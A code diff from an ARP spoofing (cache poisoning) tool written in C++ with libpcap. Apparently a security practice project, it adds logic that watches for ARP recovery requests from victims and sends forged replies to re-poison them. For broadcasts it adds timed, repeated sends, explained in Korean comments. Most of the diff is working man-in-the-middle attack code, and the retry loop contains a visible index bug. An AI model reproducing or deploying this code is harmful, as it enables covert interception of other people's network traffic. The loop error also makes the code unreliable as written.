@@ -89,7 +89,7 @@ void tCaptureAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);
 
-void tRelayAll(const char* deviceName_, Mac MyMac_,
+void tRelayAndReinfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);
 
@@ -156,14 +156,14 @@ int main(int argc, char* argv[]) {
 	ResolveSenderMacThread1.join();
 	ResolveSenderMacThread2.join();
 
-	// infect all.
+	// infect all periodically.
 	std::thread InfectThread(tInfectAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 10000);
 
-	// relay all.
-	std::thread RelayThread(tRelayAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
+	// relay all and infect all at specified time.
+	std::thread RelayAndReinfectThread(tRelayAndReinfectAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
 
 	// Wait SIGINT...
-	RelayThread.join();
+	RelayAndReinfectThread.join();
 	InfectThread.join();
 
 	// recover all.
@@ -449,6 +449,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 
 /**
  * @brief Thread function to relay given (maybe)infected senders and targets.
+ *  and re-infect when ARP recover packet be captured.
  * 
  * @param[in] deviceName_ NIC device name.
  * @param[in] MyMac_ MyMac object.
@@ -457,7 +458,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
  * @param[in] TargetIpList_ target Ip object list to relay.
  * @param[in] TargetMacList_ target Mac object list to relay.
  */
-void tRelayAll(const char* deviceName_, Mac MyMac_,
+void tRelayAndReinfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -470,7 +471,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 	if (!(SenderIpList_.size() == SenderMacList_.size()
 	 && SenderMacList_.size() == TargetIpList_.size()
 	 && TargetIpList_.size() == TargetMacList_.size())){
-		fprintf(stderr, "@tRelayAll: list size error\n");
+		fprintf(stderr, "@tRelayAndReinfectAll: list size error\n");
 		pcap_close(handle);
 		return;
 	}
@@ -489,7 +490,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 		const u_char* rawRecv;
 		res = pcap_next_ex(handle, &header, &rawRecv);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("@tRelayAll: pcap_next_ex error=%s\n", pcap_geterr(handle));
+			printf("@tRelayAndReinfectAll: pcap_next_ex error=%s\n", pcap_geterr(handle));
 			pcap_close(handle);
 			return;
 		}
@@ -498,14 +499,8 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 		eEthIpv4TcpPacket* pktHdr = (eEthIpv4TcpPacket*)rawRecv;
 		uint16_t ethType = ntohs(pktHdr->eEthHdr_.TYPE);
 		if (ethType == EthHdr::Arp){
-			// @Todo1: capture [sender -> me] ARP request(unicast to me) packet and refresh using single ARP reply packet.
-			// @Todo2: capture [sender -> all] ARP request(broadcast=expired) packet and refresh using lazy or multiple ARP reply packets.
-			// @Todo3: capture [target -> sender or all]
-			/*
-				5 6.758103642 targetMac → senderMac	ARP Who has senderIp? Tell targetIp.
-				6 8.030756996 targetMac → Broadcast	ARP Who has senderIp? Tell targetIp.
-			*/
-			//pktEthArp->arp_.sip_ == SenderIpList_.at(i)
+			// sender 혹은 target의 ARP 복구 시도 패킷이 캡처된다면, 재감염합니다.
+			// 최초 프로그램 시점에 감염되어 있었더라면, 특별한 일이 없는 이상 별도로 주기적으로 재감염할 필요가 없습니다.
 			for(int i = 0; i < listSize; i++){
 				EthArpPacket* pktEthArp = (EthArpPacket*)rawRecv;
 				if (pktEthArp->eth_.smac_ == SenderMacList_.at(i)
@@ -514,7 +509,6 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 				 && (uint32_t)pktEthArp->arp_.sip_ == htonl(SenderIpList_.at(i))
 				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
 				 && (uint32_t)pktEthArp->arp_.tip_ == htonl(TargetIpList_.at(i))){
-					printf("[1]: IF\n");
 					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
 						EthArpPacket pktSmartInfect;
 						pktSmartInfect.eth_.smac_ = MyMac_;
@@ -531,7 +525,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						pktSmartInfect.arp_.tip_ = htonl(SenderIpList_.at(i));
 
 						if (pktEthArp->eth_.dmac_ == MyMac_){
-							// @Todo1 Not expired: ARP request from sender, unicast to me.
+							// 만료되기 전에 unicast로 온다면, 재감염합니다.
 							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
 							if (res != 0) {
 								fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
@@ -541,8 +535,9 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 							break;
 						}
 						else{
-							// @Todo2 Expired: ARP request from sender, broadcast.
-							// Send multiple infection packet after target's ARP packet.
+							// 이미 만료되어 이미 broadcast가 뿌려진 상황이라면,
+							// broadcast에 대한 응답으로 target 혹은 sender가 정상적인 reply 패킷을 보내기 전에
+							// 지연시간을 넣어 우선순위를 높입니다. 혹시 모르니 nRetry번 보냅니다.
 							usleep(uLatency);
 							for (int j = 0; i < nRetry; i++){
 								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
@@ -562,7 +557,6 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 				 && (uint32_t)pktEthArp->arp_.sip_ == htonl(TargetIpList_.at(i))
 				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
 				 && (uint32_t)pktEthArp->arp_.tip_ == htonl(SenderIpList_.at(i))){
-					printf("[2]: IF\n");
 					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
 						EthArpPacket pktSmartInfect;
 						pktSmartInfect.eth_.smac_ = MyMac_;
